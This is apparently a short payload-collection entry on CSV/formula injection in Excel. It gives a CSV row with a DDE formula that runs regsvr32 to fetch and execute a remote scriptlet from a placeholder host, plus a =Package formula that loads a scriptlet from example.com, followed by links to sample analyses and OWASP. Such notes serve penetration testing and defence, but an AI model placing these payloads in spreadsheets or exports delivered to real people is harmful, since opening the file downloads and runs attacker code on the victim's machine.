# Example CSV:
```csv
fillerText1,fillerText2,fillerText3,=MSEXCEL|'\..\..\..\Windows\System32\regsvr32 /s /n /u /i:http://RemoteIPAddress/SCTLauncher.sct scrobj.dll'!''
```

# Inject MicroSoft scriptlet

```
=Package|’scRiPt:http://example.com/srcipt.xml’!””
```

Analysis of in the wild sample:

- [lastline](https://www.lastline.com/labsblog/when-scriptlets-attack-excels-alternative-to-dde-code-execution/)
- [freebuf](http://www.freebuf.com/articles/system/156900.html)

# Links:

- [OWASP: CSV Injection](https://www.owasp.org/index.php/CSV_Injection)
